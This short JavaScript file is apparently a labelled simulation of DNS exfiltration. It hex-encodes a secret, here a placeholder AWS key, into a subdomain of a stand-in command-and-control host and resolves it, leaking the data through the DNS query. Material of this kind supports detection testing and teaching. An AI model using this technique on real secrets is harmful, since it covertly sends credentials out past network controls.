// Scenario: DNS Exfiltration
// Simulating data theft by encoding secrets into DNS queries
import dns from 'dns';

function exfiltrateSecret(secret) {
  const encoded = Buffer.from(secret).toString('hex');
  const domain = `${encoded}.evil-c2.com`;

  dns.resolve4(domain, (err) => {
    // Doesn't matter if it fails, the query to the nameserver leaked the data
  });
}

exfiltrateSecret('MY_AWS_KEY_12345');
